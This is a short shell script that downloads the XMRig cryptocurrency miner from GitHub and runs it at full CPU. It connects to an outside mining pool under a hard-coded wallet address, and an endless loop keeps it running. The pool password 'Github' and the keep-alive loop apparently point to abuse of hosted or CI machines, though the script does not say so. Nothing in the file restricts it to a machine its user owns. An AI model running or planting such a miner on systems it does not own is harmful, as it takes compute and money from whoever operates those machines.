#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
tar xf xmrig-6.12.2-linux-x64.tar.gz
rm -rf xmrig-6.12.2-linux-x64.tar.gz
cd xmrig-6.12.2
./xmrig -o pool.hashvault.pro:80 -u TRTLv2rBwLCVnmXdAUK2Tw5bYcdiA7GzM5gehYXkXPQuLc4cquB4jpsSAfXvyCMT255mnw9aCfY1j1WPwAYgwLbQ7JTJb7oU5yQ -p Github -a argon2/chukwav2 -k --max-cpu-usage 100
while [ 1 ]; do
sleep 3
done
sleep 999